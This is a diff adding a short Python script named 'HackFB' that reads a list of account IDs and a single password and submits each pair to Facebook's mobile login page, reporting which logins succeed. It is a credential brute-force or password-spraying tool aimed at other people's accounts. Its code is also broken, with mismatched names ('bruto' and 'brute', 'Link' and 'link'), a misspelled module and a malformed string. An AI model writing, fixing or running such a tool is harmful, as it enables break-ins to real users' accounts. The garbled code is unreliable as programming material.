@@ -1,0 +1,26 @@
+# HackFB
+import requests
+id = input("Enter ID list : ")
+pw = input("password to crack : ")
+
+
+def bruto(id,pw):
+        Link = "https://m.facebook.com/login.php"
+        data = {"email":id, "pass":pw}
+        r = request .post (link, data=data)
+        if "m_sess" in r.url:
+                print ("found "+ id +" ~> "+ pw)
+        elif "checkpoin" in r.url:
+                print (""checkpoint "+ id + " ~> " + pw)
+        else:
+                print ("failed "+ id )
+
+def list(id,pw):
+         file = open(id, "r").readlines()
+         for i in file:
+                 brute(i.strip(),pw)
+ try:
+         list(id,pw)
+ 
+ except:
+         exit()
